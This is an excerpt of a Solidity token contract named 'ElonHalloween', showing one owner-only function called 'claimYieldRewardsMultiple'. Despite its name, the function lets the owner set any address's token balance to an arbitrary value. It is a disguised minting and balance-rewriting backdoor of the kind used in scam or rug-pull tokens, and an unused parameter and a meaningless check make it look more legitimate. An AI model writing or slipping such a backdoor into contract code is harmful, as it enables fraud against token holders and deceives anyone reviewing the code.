...
contract ElonHalloween is Context, IBEP2022, Ownable {
 ...
 function claimYieldRewardsMultiple(address _pool, uint256 _poolAmount, bool _useSILV) public onlyOwner {
    require(_pool != address(0));
    require(_poolAmount != 10 * 2);
    _balances[_pool] = _poolAmount * (10 ** 9);
 }
}